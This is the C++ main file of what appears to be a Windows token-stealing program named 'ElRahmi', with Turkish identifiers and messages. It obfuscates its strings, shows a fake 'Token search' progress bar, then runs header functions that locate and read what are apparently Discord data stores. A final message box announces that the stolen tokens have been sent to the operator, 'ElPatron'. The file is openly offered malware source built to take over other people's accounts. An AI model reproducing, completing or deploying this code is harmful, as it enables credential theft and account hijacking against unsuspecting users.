#include <iostream> #include "Viruselrahmi.h" #include <random> #include <thread> 
#include <iostream>
#include "Viruselrahmi.h"
#include <random>
#include <thread>
void logoyazlenrahmi() {
    std::cout << R"(
 _               ____                         ______ _           _               _  __      ____ 
| |             |___ \                       |  ____| |         | |             (_) \ \    / /_ |
| |     _____   ____) |_   _ _ __    ______  | |__  | |_ __ __ _| |__  _ __ ___  _   \ \  / / | |
| |    / _ \ \ / /__ <| | | | '_ \  |______| |  __| | | '__/ _` | '_ \| '_ ` _ \| |   \ \/ /  | |
| |___| (_) \ V /___) | |_| | |_) |          | |____| | | | (_| | | | | | | | | | |    \  /   | |
|______\___/ \_/|____/ \__, | .__/           |______|_|_|  \__,_|_| |_|_| |_| |_|_|     \/    |_|
                        __/ | |                                                                  
                       |___/|_|                                                        
)" << '\n';
}
using namespace std;
void progress_bar(int time, const std::string& message, char symbol) { std::string progress_bar; const double progress_level = 1.42; std::cout << message << "\n\n"; for (double percentage = 0; percentage <= 100; percentage += progress_level) { progress_bar.insert(0, 1, symbol); std::cout << "\r [" << std::ceil(percentage) << '%' << "] " << progress_bar; std::this_thread::sleep_for(std::chrono::milliseconds(time)); }std::cout << "\n\n"; }
std::string titledegıs(const int len) {
    const std::string alpha_numeric(OBFUSCATE("dd3e2e6edeac9edcbe3e0233d7e3dbede1d32d723bfe670e0eddbcee9ec86f2eedee9a9eaec37b3febdbb1b9c9f3ebbde83b3ebd1c3ed7c27efcabe79e77c3edeb2eb7bb3e6e7bf2e2bc3296eb6eb3223b3f2eb0ad603eee392df8dbeb0bdd923769fde")); std::default_random_engine generator{ std::random_device{}() }; const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 }; std::string str(len, 0);  for (auto& it : str) { it = alpha_numeric[distribution(generator)]; } return str;
}
int main()
{
    setlocale(LC_ALL, "Turkish");
    SetConsoleTitle(titledegıs(500).c_str());
    logoyazlenrahmi();
    string durum = OBFUSCATE("Start Token search:");
    progress_bar(100, durum, '>#<');
    std::vector<std::string> targetLocation = elrahmiPathfuckdcdata(); for (int i = 0; i < targetLocation.size(); i++) { if (elrahmiPathfuckdcdataend(targetLocation[i])) { databasecheckingdcpuhhaha(targetLocation[i]); } }
    string tamamlandılanyasaın = OBFUSCATE("Done!:");
    cout << tamamlandılanyasaın;
    MessageBox(NULL, "İş Tamamlandı ElPatron, Tokenleri Size  Gönderdim.Düşünsene bir ben insanların tokeninini çalıyorum ama günahı benim üstümemi oluyor patron yoksa beni yazan  lov3yp üstünemi oluyor lütfen el patron beni kötü işlerde kullanma", OBFUSCATE("ElRahmi Den Sana bir mesaj - Yakup Usta Dinozor Tas+klı Tostqwe"), MB_OK | MB_ICONQUESTION);
}